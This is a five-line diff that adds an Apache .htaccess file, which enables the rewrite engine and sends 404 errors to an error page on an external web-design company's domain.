@@ -1,0 +1,5 @@
+
+
+RewriteEngine On
+
+ErrorDocument 404 https://garantiwebtasarim.com/webing/404.html
